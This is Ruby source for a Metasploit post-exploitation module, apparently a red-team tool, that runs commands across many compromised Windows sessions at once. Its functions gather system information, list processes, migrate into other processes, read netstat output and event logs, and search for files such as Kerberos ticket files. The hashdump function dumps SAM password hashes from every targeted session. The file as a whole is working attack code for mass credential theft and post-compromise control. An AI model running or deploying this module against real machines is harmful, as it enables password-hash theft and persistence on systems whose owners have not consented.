require 'msf/core'

class MetasploitModule < Msf::Post

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'qurmi is post exploit module to run mass command',
        'Description'   => %q{
          Qurmi is a metasploit module that can be post exploit operations more sessions at the same time.
        },
        'License'       => MSF_LICENSE,
        'Author'        => ['musana - Musa ŞANA'],
        'Platform'      => ['win'],
        'SessionTypes'  => ['meterpreter', 'shell']
    ))
  end

@@targets = []
@@selectedTargets = []
@@commands = ['exit', 'quit', 'q', 'help', 'migrate', '?', 'clear', 'unset_targets', nil, 'show_targets', 'show_sessions', 'set_targets']
@@post_commands = ['sysinfo', 'search', 'show_processes', 'eventlog', 'hashdump', 'network_status']
@@allCommands = @@commands + @@post_commands

  def banner
    banner1 = '
     █████   ██████   ███████   █████  
    ██   ██  ██  ▀██  ██   ██  ██   ██ 
    ██   ██  ██   ██  ██▄▄     ██   ██ 
    ███████  ██   ██  ██▀▀     ██   ██ 
    ██   ██  ██  ▄██  ██   ██  ██   ██ 
    ██   ██  ██████   ███████   █████  
                    
    [adeosecurity.com] - [@musa_sana]  '

    banner2 = '
    [adeosecurity.com]                           db 
                                                    
     odWWYOO  MM    MM  MMHHHHH  MMHHHHOOHHHHMM  MM 
    fW    MM  MM    MM  MM   UU  MM    MM    MM  MM 
    8M    MM  MM    MM  MM       MM    MM    MM  MM 
    YA    MM  MM    MM  MM       MM    MM    MM  MM 
     WMWWWMM  UUOOOOOU  MM       MM    MM    MM  MM
          MM                                         
          MM         ******************************
                     ** [Musa ŞANA]-[@musa_sana] **
                     **   2017 - Adeo Security   **
                     ******************************'

    banners = [banner1, banner2]
    return banners.sample
  end


  def helpMenu
    menu1 = {
     'help, ?':       'Help menu or type ?',
      clear:          'Clear Terminal',
     'exit, quit, q': 'Exit this module',
      show_sessions:  'Show active sessions list',
      show_targets:   'Show selected target(s) list',
      unset_targets:  'Unset selected target(s)',
      set_targets:    'Select target(s)',
      migrate:        'Migrate a process. For help -h parameter'
    }

    menu2 = {
      sysinfo:        'Get information about systems',
      search:         'Search a file on all targeted sessions. for help -h parameter',
      show_processes: 'List processes on all targeted sessions',
      network_status: 'List listen and established ports or local ip.',
      eventlog:       'View event log for detect silver or golden ticket. for help -h parameter',
      hashdump:       'Dumping SAM database'    
    }

    basicCommands = Rex::Text::Table.new( 
        'Header'  => 'Basic Commands',
        'Indent'  => 2,
        'Columns' => [
          "Command",
          "Description"
    ])

    postCommands = Rex::Text::Table.new( 
        'Header'  => 'Post Commands',
        'Indent'  => 2,
        'Columns' => [
          "Command",
          "Description"
    ])

    menu1.each_pair do |c, d|
      basicCommands << [c,d]
    end

    menu2.each_pair do |c, d|
    postCommands << [c,d]
    end

    print_line("\n" + basicCommands.to_s)
    print_line("\n" + postCommands.to_s)
  end


  def clear
    system("clear")
  end


  def showTargets
    table = Rex::Text::Table.new( 
    'Indent'  => 2,
    'Header'  => "\nSelected Targets",
    'Columns' => [
      'Id',
      'Platfrom',
      'Type',
      'Machine Info',
      'Connection'
    ])

    @@selectedTargets.each do |t| 
      table << [
        framework.sessions[t].sid.to_s, 
        framework.sessions[t].session_type.to_s,
        framework.sessions[t].type.to_s,
        framework.sessions[t].info.to_s,
        framework.sessions[t].tunnel_to_s.to_s
      ]
    end
    print_line(table.to_s)
  end


  def is_numeric(i)
      true if Integer(i) rescue false
  end


  def setTarget par
    if par.include?"," 
      @@targets = par.split(",")

    elsif par.include?"-"
      range = par.split("-")
      range[0].upto(range[1]) { |t| @@targets.push(t) }

    elsif par == "all"
      framework.sessions.each {|t| @@targets.push(t[0])}

    elsif is_numeric(par)
      @@targets.push(par)
    
    elsif not is_numeric(par)
      print_warning "Target is not selected!"
      print_status("Usage: set_targets <parameter>. Example: set_targets [all ; 2-13 ; 2,5,4,9]")
    
    else
      print_error "Wrong parameter or command"
    end

    @@targets.map!(&:to_i)

    framework.sessions.each do |i| 
    if @@targets.include?i[0] and @@selectedTargets.exclude?i[0]
       @@selectedTargets.push(i[0])
      end
    end
    return @@targets
  end


  def showSessions
    table = Rex::Text::Table.new( 
    'Indent'  => 2,
    'Header'  => "\nActive Sessions",
    'Columns' => [
      'Id',
      'Platfrom',
      'Type',
      'Machine Info',
      'Connection'
    ])

    framework.sessions.each do |t|
      table << [t[1].sid, t[1].session_type, t[1].type, t[1].info, t[1].tunnel_to_s]
    end
    print_line(table.to_s)
  end


  def unsetTarget
    @@selectedTargets = []
    @@targets = []
  end


  def getInfo cli
    info = Rex::Text::Table.new( 
    'Indent'  => 0,
    'Columns' => [
      "",
      ""
    ])
    
    cli.sys.config.sysinfo.each_pair do |i,j|
      info << [i,": "+j.to_s]
      end
    print_line(info.to_s)
  end


  def networkInfo cli, i
    print_status "Only showing listen port and established port"
    r = cli.sys.process.execute("cmd.exe /c #{i}", nil, {'Hidden'=>true, 'Channelized'=>true})
    r.channel.read.split("\n").each do |i|       
      if i.include?"LISTENING" and i.include?"."
          puts i
      elsif i.include?"ESTABLISHED" and i.include?"."
          puts i
      end
    end
    r.channel.close
    r.close
  end


  def listProcess cli
    print_status("Getting process list...")
    tbl = Rex::Text::Table.new( 
      'Header'  => "Processes that can be migrate",
      'Indent'  => 2,
      'Columns' => [
        "PID",
        "ARCH",
        "NAME",
        "PATH"
      ])      
    cli.sys.process.get_processes.each do |proc|
      if cli.sys.config.getuid.to_s == proc["user"]
        tbl << [proc['pid'], proc['arch'], proc['name'], proc['path']]
        end
      end

    print_line("\n" + tbl.to_s + "\n")
  end


  def migrate *args
    sess = nil 
    pid  = nil

    opts = Rex::Parser::Arguments.new(
    "-h" => [false, "Help menu" ],
    "-s" => [true, "Session number"],
    "-p" => [true, "process id number"]
    )

  opts.parse(args) { | opt, idx, val |
    case opt
      when "-h"
        print_line(opts.usage)
        return
      when "-s"
        sess = val
      when "-p"
        pid = val
      else
        print_error "Wrong Parameter!"
    end
  }

    if @@selectedTargets.include?sess.to_i
      cli = framework.sessions.get(sess.to_i)
      begin
        cli.core.migrate(pid.to_i)
        print_good "Migration is successful! SESSION: ["+sess+"] - PID: ["+pid+"]"
      rescue
        print_error "Migration is failed!"
      end
    else
      print_error "Selected session is not include targeted sessions list or wrong parameter!"
    end
  end


  def hashDump cli
    begin
      cli.priv.sam_hashes.each do |user|
        puts "#{user}"
        end
    rescue
      print_error "Permission Denied!"
    end
  end


  def searchFile(cli, *args)
    root    = nil
    recurse = true
    globs   = []
    files   = []
    columns = ['SIZE', 'PATH']

    opts = Rex::Parser::Arguments.new(
      '-h' => [false, 'Help Banner.' ],
      '-d' => [true,  'The directory/drive to begin searching from. Leave empty to search all drives.'],
      '-f' => [true,  'A file pattern glob to search for. [example: *.kirbi or *.sql etc]'],
      '-r' => [true,  'Recursivly search sub directories. (Default: #{recurse})']
    )

    opts.parse(args) { | opt, idx, val |
      case opt
        when "-h"
          print_line "Usage: search [-d dir] [-r recurse] -f pattern [-f pattern]..."
          print_line "Search for files."
          print_line opts.usage
          return
        when "-d"
          root = val
        when "-f"
          globs << val
        when "-r"
          recurse = false if val =~ /^(f|n|0)/i
      end
    }

    if globs.empty?
      print_error "You must specify a valid patern to search for, example: search -f *.kirbi"
      return
    end

    globs.each do |glob|
      files += cli.fs.file.search(root, glob, recurse)
    end

    files.each {|k| k['path'] = k['path'].capitalize}

    if files.empty?
      print_line("No files matching your search were found.")
      return
    end

    foundcount = "Found #{files.uniq.length} result#{ files.length > 1 ? 's' : '' }..."    

    table = Rex::Text::Table.new( 
     'Header'  => "\n"+foundcount,
     'Indent'  => 2,
     'Columns' => columns
     )

    files.uniq.each do | file |
        table << ["#{file['size']} bytes", "#{file['path']}#{ file['path'].empty? ? '' : '\\' }#{file['name']}"]
    end
    print_line(table.to_s)
  end


  def eventLog cli, *args
    filter  = nil
    logName = nil
    count   = nil

    opts = Rex::Parser::Arguments.new(
    "-h" => [false, "Help menu" ],
    "-c" => [true,  "Record count of event logs"],
    "-l" => [true,  "List a given event log. Valid Value: [Security]"],
    "-f" => [true,  "Event ID to filter events on. Valid Values: [4624, 4634, 4672]"],
    )

    opts.parse(args) do |opt, idx, val|
    case opt
      when "-h"
        print_line opts.usage
        return
      when "-l"
        logName = val
      when "-f"
        filter  = val
      when "-c"
        count   = val
      else
        print_warning("Invalid Parameter")
    end
    end  
    list_logs cli, logName, filter, count
  end


  def list_logs cli, eventlog_name, filter, count
    yes    = "%bld%grn [+] %clr"
    no     = "%bld%red [-] %clr"
    filter = filter.to_i
    count  = count.to_i
    cnt    = 0

    logview = Rex::Text::Table.new( 
       'Header'  => "\nListed lastest #{count} record of #{filter} event id",
       'Indent'  => 1,
       'Columns' => [
          "DATE",
          "EVENT ID",
          "COMPUTER NAME",
          "ACCOUNT NAME",
          "ACCOUNT DOMAIN",
          "REAL DOMAIN",
          "LOG ON",
          "TICKET"
    ])

    begin
      event_data = ""
      log = cli.sys.eventlog.open(eventlog_name)
      log.each_backwards do |e|

        if e.eventid == filter.to_i
          eventId    = e.eventid
          eventDate  = e.generated
          domain     = e.strings[2]

          case filter
          when 4624
            accountName  = e.strings[5]
            computerName = e.strings[1]
            logonType    = e.strings[8]

          when 4672
            accountName  = e.strings[1]
            computerName = ""
          when 4634
            logonType    = e.strings[4]
            accountName  = e.strings[1]
          end

          realDomain = cli.sys.config.sysinfo['Domain']
          detect     = if domain == realDomain or domain == "NT AUTHORITY" or domain == "-" then no else yes end
          logview << [eventDate.to_s.chomp(" +0300"), eventId, computerName, accountName, domain, realDomain, logonType, detect]
          cnt += 1
        end
          break if cnt == count
      end
      print_line(logview.to_s)

    rescue
      print_error("Failed to Open Event Log #{eventlog_name}")
    end
  end


  def runPostModule cmd, inp=""
    if @@post_commands.include?cmd
      @@selectedTargets.each do |t|
      cli = framework.sessions.get(t)
      cli.console.tab_complete cmd
 
      puts "\n#{'_'*160} \n\n"
      print_line("%bld%yel [TARGET #{cli.sid}] Name:#{cli.info}  Connection:#{cli.tunnel_to_s} %clr")
      puts "#{'_'*160}"

      case cmd
      when "sysinfo"
        getInfo cli

      when "show_processes"
        listProcess cli

      when "eventlog"
        par = inp.split(" ").drop(1)
        eventLog cli, *par

      when "search"
        par = inp.split(" ").drop(1)
        searchFile cli, *par

      when "hashdump"
        hashDump cli

      when "network_status"
        networkInfo cli, "netstat -an"
      end
    end

    else
      print_error "Unknown Command!"
    end
  end


  def run
    puts banner
    helpMenu

    while true
      #print("\n%bld%grnadeo >> %clr")
      comp = proc { |s| @@allCommands.grep(/^#{Regexp.escape(s)}/) }
      Readline.completion_append_character = " "
      Readline.completion_proc = comp

      inp = Readline.readline(print("%bld%grn>%clr"), true)
      puts ""
      command = inp.split(" ")[0]

      if @@commands.include?command 

        case command
        when "exit", "quit", "q"
          break

        when "help", "?"
          helpMenu

        when "clear"
          clear

        when "unset_targets"
          unsetTarget

        when nil
          next

        when "show_sessions"
          showSessions

        when "set_targets"
          trgt = inp.split(" ")[1].nil? ? "f" : inp.split(" ")[1]
          setTarget trgt

        when "show_targets"
          showTargets

        when "migrate"
          par = inp.split(" ").drop(1)
          migrate *par
        end #case

      else
        if @@post_commands.include?command and @@selectedTargets.empty?
          print_error("Target is not selected. Once select target(s)")
        else
          runPostModule command, inp
        end

      end #if
    end #while
  end #run

end